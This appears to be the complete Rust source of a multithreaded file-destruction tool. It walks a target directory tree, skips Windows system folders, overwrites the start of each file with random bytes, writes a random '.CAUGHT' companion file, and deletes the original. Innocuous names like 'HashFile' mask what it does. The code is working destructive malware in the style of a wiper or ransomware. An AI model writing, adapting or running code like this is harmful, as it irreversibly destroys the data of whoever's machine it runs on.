use std::env;
use std::io::Write;
use rand::prelude::*;
use std::time::Instant;
use std::fs::{self, File, OpenOptions};
use std::path::{PathBuf, Path};
use std::thread::{self, JoinHandle, available_parallelism};

const EROR_HEAD:&str = "[!] ";
const INFO_HEAD:&str = "[i] ";
const MISC_HEAD:&str = "[*] ";
const IMPT_HEAD:&str = "[#] ";

fn HashFile(file: &PathBuf)
{
    let path_str: &str = file.as_path().to_str().unwrap();
    let mut new_data: [u8; 100] = [0u8; 100];
    let new_str: String = format!("{}{}", path_str, ".CAUGHT");
    let new_path: &Path = Path::new(new_str.as_str());
    match OpenOptions::new().write(true).read(false).open(file)
    {
        Ok(mut file_handle) => {
            let mut rng: ThreadRng = rand::rng();
            for _i in 0..4
            {
                rng.fill(&mut new_data);
                if new_data == [0u8; 100]
                {
                    println!("{}Failed to write new data to buffer!", EROR_HEAD);
                } else {
                    match file_handle.write(&new_data)
                    {
                        Ok(_) => {
                            let _ = file_handle.flush();
                            continue;
                        },
                        Err(error) => {
                            println!("{}Failed to write to {:?}, error: {:?}", EROR_HEAD, path_str, error);
                            break;
                        }
                    }
                }
                new_data = [0u8; 100];
            }
            let _ = drop(file_handle);
            match File::create_new(new_path)
            {
                Ok(mut file) => {
                    for _i in 0..4
                    {
                        rng.fill(&mut new_data);
                        if new_data == [0u8; 100]
                        {
                            println!("{}Failed to write data to buffer!", EROR_HEAD);
                        } else {
                            match file.write_all(&new_data)
                            {
                                Ok(_) => {
                                    continue;
                                },
                                Err(_) => {
                                    println!("{}Failed to write new data to {:?}.", EROR_HEAD, new_str);
                                    break;
                                }
                            }
                        }
                    }
                },
                Err(error) => {
                    println!("{}Failed to create new file for holding data, error: {:?}", EROR_HEAD, error);
                }
            }
        },
        Err(error) => {
            println!("{}Failed to create file handle, error: {:?}", EROR_HEAD, error);
        }
    }
}

fn HashFiles(files: Vec<PathBuf>)
{
    for file in files.iter()
    {
        HashFile(file);
        match fs::remove_file(&file)
        {
            Ok(_) => {
                continue;
            },
            Err(error) => {
                println!("{}Failed to remove file {:?}, error code: {:?}", EROR_HEAD, file.to_str(), error);
            }
        }
    }
}

fn main()
{
    println!("{}Start of program.", IMPT_HEAD);
    let args: Vec<String> = env::args().collect();
    if args.len() != 2
    {
        println!("{}End of program.", IMPT_HEAD);
        return ();
    }
    let mut folders_to_search: Vec<PathBuf> = Vec::with_capacity(100000);
    let mut add_buffer: Vec<PathBuf> = Vec::with_capacity(1000);
    let mut files: Vec<PathBuf> = Vec::with_capacity(100000);
    let mut thread_groups: Vec<JoinHandle<()>> = Vec::new();
    let cpu_count: usize = available_parallelism().unwrap().get();
    let amount_per_thread: usize;
    let mut last_itteration: usize = 0;
    let banned_items: [&str; 9] = ["C:\\Windows", "C:\\Users\\Public", "C:\\Users\\Default",
    "C:\\bootmgr", "C:\\BCD", "C:\\pagefile.sys", "C:\\hiberfil.sys", "C:\\Program Files", "$WINDOWS.~BT"];
    folders_to_search.push(PathBuf::from(&args[1]));
    println!("{}Getting file paths...", MISC_HEAD);
    let now = Instant::now();
    while folders_to_search.len() > 0
    {
        for directory in folders_to_search.iter()
        {
            match fs::read_dir(&directory)
            {
                Ok(items) => {
                    for item in items
                    {
                        if let Ok(entry) = item
                        {
                            let entry_path: PathBuf = entry.path();
                            if !(banned_items.contains(&entry_path.to_str().unwrap()))
                            {
                                if entry_path.is_dir()
                                {
                                    add_buffer.push(PathBuf::from(entry_path));
                                } else {
                                    files.push(PathBuf::from(entry_path));
                                }
                            }
                        }
                    }
                },
                Err(error) => {
                    println!("{}Failed to read directory {:?}, with error; {}", EROR_HEAD, directory, error);
                }
            }
        }
        folders_to_search.clear();
        folders_to_search.append(&mut add_buffer);
        add_buffer.clear();
    }
    println!("{}Found {:?} files in {:?}", INFO_HEAD, files.len(), now.elapsed());
    println!("{}Organizing files into thread groups...", INFO_HEAD);
    let mut thread_info: Vec<Vec<PathBuf>> = Vec::new();
    let mut remove_list: Vec<usize> = Vec::new();
    amount_per_thread = files.len() / cpu_count;
    for _i in 0..cpu_count
    {
        let mut file_group: Vec<PathBuf> = Vec::new();
        for i in last_itteration..(last_itteration + amount_per_thread)
        {
            file_group.push(files[i].clone());
        }
        last_itteration += amount_per_thread;
        thread_info.push(file_group);
    }
    println!("{}Created {:?} thread groups...", MISC_HEAD, thread_info.len());
    println!("{}Adding thread data to live threads...", MISC_HEAD);
    for i in thread_info.clone()
    {
        thread_groups.push(thread::spawn(move || {
            HashFiles(i.to_owned());
        }));
    }
    while !thread_groups.is_empty()
    {
        let mut itterator: usize = 0;
        for handle in thread_groups.iter()
        {
            if handle.is_finished()
            {
                remove_list.push(itterator);
            }
            itterator += 1;
        }
        for i in remove_list.iter()
        {
            thread_groups.remove(*i);
        }
        remove_list.clear();
    }
    println!("{}Took {:?} to run full file.", INFO_HEAD, now.elapsed());
    println!("{}End of program.", IMPT_HEAD);
    return ();
}
